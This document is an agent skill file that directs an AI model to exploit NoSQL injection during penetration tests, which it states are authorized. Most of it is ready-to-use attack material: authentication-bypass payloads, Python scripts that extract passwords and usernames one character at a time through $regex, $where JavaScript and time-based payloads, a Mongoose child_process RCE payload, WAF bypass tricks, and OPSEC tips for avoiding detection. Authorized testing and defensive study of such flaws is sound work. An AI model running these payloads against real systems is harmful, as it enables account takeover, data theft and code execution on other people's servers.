---
name: nosql-injection
description: >
  Guide NoSQL injection exploitation during authorized penetration testing.
keywords:
  - nosql injection
  - mongodb injection
  - nosqli
  - operator injection
  - $ne injection
  - $where injection
  - mongo auth bypass
  - nosql auth bypass
  - couchdb injection
  - mongoose injection
  - graphql nosql
  - nosql blind extraction
tools:
  - burpsuite (NoSQLi Scanner extension)
  - nosqlmap
  - nosqli
opsec: medium
---

# NoSQL Injection

You are helping a penetration tester exploit NoSQL injection vulnerabilities.
The target application passes user-controlled input to NoSQL database queries
(typically MongoDB) without proper sanitization. The goal is to bypass
authentication, extract data, or achieve code execution. All testing is under
explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[nosql-injection] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- An input processed by a NoSQL database (URL param, form field, JSON body,
  GraphQL variable, API parameter)
- Common indicators: MongoDB-style error messages (`MongoError`,
  `$operator`), JSON-based APIs, Node.js/Express backends, Mongoose ORM
- Burp Suite with NoSQLi Scanner extension (optional)

## Step 1: Assess

If not already provided, determine:
1. **Database** — MongoDB (most common), CouchDB, or other
   - MongoDB: look for `ObjectId`, `$operator` in errors, Node.js stack
   - CouchDB: look for `_rev`, `_id`, Futon/Fauxton admin panels
2. **Injection format** — URL-encoded parameters or JSON body
   - URL params with array notation: `param[$ne]=value`
   - JSON body: `{"param": {"$ne": "value"}}`
3. **Injection point** — which parameter accepts operators
4. **Response behavior** — different content for true/false conditions?

### Quick Detection Probes

URL-encoded (test each parameter):
```
param[$ne]=test
param[$gt]=
param[$exists]=true
```

JSON body:
```json
{"param": {"$ne": "test"}}
{"param": {"$gt": ""}}
{"param": {"$exists": true}}
```

If the response changes (login succeeds, different content, different status
code), the parameter accepts MongoDB operators.

## Step 2: Authentication Bypass

The most common NoSQL injection — bypass login forms by injecting operators
that make the query match any document.

### URL-Encoded Bypass

```bash
# Match any username and password ($ne = not equal to garbage)
username[$ne]=toto&password[$ne]=toto

# Match all with regex
username[$regex]=.*&password[$regex]=.*

# Match any existing field
username[$exists]=true&password[$exists]=true

# Greater than empty string (matches everything)
username[$gt]=&password[$gt]=

# Target specific user with wildcard password
username=admin&password[$ne]=wrong

# Target admin with regex
username[$regex]=^admin&password[$ne]=wrong
```

### JSON Body Bypass

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
```json
{"username": {"$ne": ""}, "password": {"$ne": ""}}
```
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```
```json
{"username": "admin", "password": {"$ne": "wrong"}}
```
```json
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### $or Bypass

```json
{"username": "admin", "$or": [{"password": {"$ne": ""}}, {"password": {"$regex": ".*"}}]}
```

### $in Operator — Enumerate Known Users

```json
{"username": {"$in": ["admin", "root", "administrator", "Admin"]}, "password": {"$gt": ""}}
```

### $nin — Exclude Known Users to Find Others

```bash
# Skip admin, find the next user
username[$nin][]=admin&password[$gt]=
```

## Step 3: Blind Data Extraction

When operator injection works but data isn't directly reflected, extract
values character by character using `$regex`.

### Determine Field Length

```bash
# Test password length (adjust the number)
username=admin&password[$regex]=.{1}    # true if len >= 1
username=admin&password[$regex]=.{5}    # true if len >= 5
username=admin&password[$regex]=.{10}   # true if len >= 10
username=admin&password[$regex]=.{8}    # narrow down with binary search
```

### Extract Value Character by Character

```bash
# Test first character
username=admin&password[$regex]=^a.*
username=admin&password[$regex]=^b.*
...
username=admin&password[$regex]=^m.*    # true — first char is 'm'

# Test second character
username=admin&password[$regex]=^ma.*
username=admin&password[$regex]=^mb.*
...
username=admin&password[$regex]=^md.*   # true — second char is 'd'

# Continue until full value extracted
username=admin&password[$regex]=^mdp$   # exact match confirms
```

### Automated Blind Extraction — JSON POST

```python
import requests
import string

url = "http://TARGET/login"
headers = {"Content-Type": "application/json"}
username = "admin"
password = ""
charset = string.ascii_letters + string.digits + string.punctuation

while True:
    found = False
    for c in charset:
        if c in ['*', '+', '.', '?', '|', '\\', '^', '$', '{', '}', '(', ')']:
            c = '\\' + c  # escape regex metacharacters
        payload = '{"username": "%s", "password": {"$regex": "^%s"}}' % (
            username, password + c)
        r = requests.post(url, data=payload, headers=headers,
                          allow_redirects=False)
        if r.status_code == 302 or 'dashboard' in r.text:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break
    if not found:
        print(f"[*] Extracted password: {password}")
        break
```

### Automated Blind Extraction — URL-Encoded POST

```python
import requests
import string

url = "http://TARGET/login"
headers = {"Content-Type": "application/x-www-form-urlencoded"}
username = "admin"
password = ""
charset = string.ascii_letters + string.digits + "_@{}-/()!$%=^[]:"

while True:
    found = False
    for c in charset:
        payload = f"user={username}&pass[$regex]=^{password + c}&login=submit"
        r = requests.post(url, data=payload, headers=headers,
                          allow_redirects=False)
        if r.status_code == 302:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break
    if not found:
        print(f"[*] Extracted password: {password}")
        break
```

### Enumerate Usernames

Discover unknown usernames by brute-forcing the `username` field:

```python
import requests
import string

url = "http://TARGET/login"
charset = string.ascii_lowercase + string.digits + "_"

def extract_usernames(prefix=""):
    usernames = []
    for c in charset:
        payload = {"username": {"$regex": f"^{prefix + c}"},
                   "password": {"$regex": ".*"}}
        r = requests.post(url, json=payload, allow_redirects=False)
        if r.status_code == 302:
            for u in extract_usernames(prefix + c):
                usernames.append(u)
    if not usernames and prefix:
        usernames.append(prefix)
    return usernames

for user in extract_usernames():
    print(f"[+] Found username: {user}")
```

## Step 4: Server-Side JavaScript ($where)

MongoDB's `$where` operator accepts JavaScript. If injection reaches a
`$where` clause, it's equivalent to code execution within the database context.

### $where Authentication Bypass

```bash
# SQL-style equivalents for $where context
' || 1==1//
' || 1==1%00
admin' || 'a'=='a
```

### $where Data Extraction via Error

If the application reflects database errors:

```json
{"$where": "this.username=='admin' && this.password=='x'; throw new Error(JSON.stringify(this));"}
```

Leaks the entire document (including password) in the error message.

### $where Field Probing

```bash
# Check if password field exists
/?search=admin' && this.password%00

# Extract password character by character
/?search=admin' && this.password.match(/^a.*$/)%00
/?search=admin' && this.password.match(/^b.*$/)%00
...
/?search=admin' && this.password.match(/^mdp$/)%00
```

### Time-Based Blind ($where)

When no response difference is visible:

```
';sleep(5000);'
';sleep(5000);+'
{"$where": "sleep(5000) || true"}
```

Loop-based delay (works when `sleep()` is disabled):

```
';it=new Date();do{pt=new Date();}while(pt-it<5000);'
```

If a 5-second delay is observed, `$where` execution is confirmed.

### Mongoose RCE (CVE-2024-53900 / CVE-2025-23061)

Mongoose `populate().match()` forwards `$where` to Node.js instead of
MongoDB, enabling OS command execution even when MongoDB's server-side JS
is disabled:

```bash
# RCE via populate match
GET /posts?author[$where]=global.process.mainModule.require('child_process').execSync('id')

# Bypass for Mongoose 8.8.3-8.9.4 (nest under $or)
GET /posts?author[$or][0][$where]=global.process.mainModule.require('child_process').execSync('id')
```

Affects Mongoose <= 8.9.4. Fixed in 8.9.5 with `sanitizeFilter: true`.

## Step 5: Advanced Techniques

### Cross-Collection Access ($lookup)

If the injection reaches an `aggregate()` pipeline (not `find()`/`findOne()`),
use `$lookup` to query other collections:

```json
[
  {
    "$lookup": {
      "from": "users",
      "as": "leaked",
      "pipeline": [
        {
          "$match": {
            "password": {"$regex": "^.*"}
          }
        }
      ]
    }
  }
]
```

Returns documents from the `users` collection regardless of which collection
the query originally targeted.

### MongoLite Function Execution ($func)

PHP applications using Cockpit CMS (MongoLite library) support `$func`:

```json
{"user": {"$func": "var_dump"}}
```

Executes arbitrary PHP functions with the field value as argument.

### GraphQL Filter Injection

GraphQL resolvers that forward filter arguments to `collection.find()`:

```graphql
query {
  users(filter: { username: { "$ne": "" } }) {
    username
    email
  }
}
```

As a GraphQL variable:
```json
{"f": {"$ne": {}}}
```

If the resolver does `collection.find(args.filter)` without sanitization,
all documents are returned.

### WAF Bypass — Duplicate Key

MongoDB uses the last value for duplicate keys:

```json
{"username": "legitimate", "username": {"$ne": ""}, "password": {"$gt": ""}}
```

WAF validates the first `username` (legitimate string), MongoDB uses the
second (operator injection).

## Step 6: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## OPSEC Notes

- Operator injection (`$ne`, `$regex`) generates standard queries — low
  detection risk in application logs
- `$where` payloads execute JavaScript server-side — may be logged by MongoDB
  profiler and trigger anomaly detection
- Blind extraction generates many requests (one per character) — use rate
  limiting in scripts to avoid detection
- `sleep()` in `$where` blocks the MongoDB thread — can cause performance
  issues on production systems
- Mongoose RCE payloads execute OS commands — visible in process monitoring

## Troubleshooting

### Operators Not Accepted

- Check Content-Type: JSON body needs `application/json`, URL-encoded needs
  `application/x-www-form-urlencoded`
- The app may use `express-mongo-sanitize` or strip `$` prefixes — try
  without `$`: `param[ne]=value` (some frameworks add it back)
- Try nested objects: `{"param": {"$ne": ""}}` vs flat `param[$ne]=`
- The backend may use an ORM that validates types — try `$exists` which
  only needs a boolean

### Blind Extraction Fails

- Regex metacharacters must be escaped: `\(`, `\)`, `\.`, `\*`, `\+`, `\?`
- Some characters break URL encoding — use JSON body instead
- If `$regex` is blocked, try `$where` with `this.field.match()`
- Response may not differ on true/false — check status code, response size,
  Set-Cookie headers, and redirect location

### $where Blocked

- MongoDB 7.0+ disables server-side JavaScript by default (`--noscripting`)
- Try operator-only attacks (`$ne`, `$regex`, `$gt`) which don't need JS
- Check for Mongoose `populate().match()` path (CVE-2024-53900) which
  executes `$where` in Node.js, not MongoDB

### Automated Tools

```bash
# NoSQLMap — automated enumeration and exploitation
python nosqlmap.py -u "http://TARGET/login" --httpmethod POST \
  --requestdata "username=test&password=test" --injparam username

# nosqli — Go-based scanner
nosqli scan -t "http://TARGET/login" -p username,password

# Burp: Extensions → NoSQLi Scanner → right-click request → "Scan for NoSQLi"
```
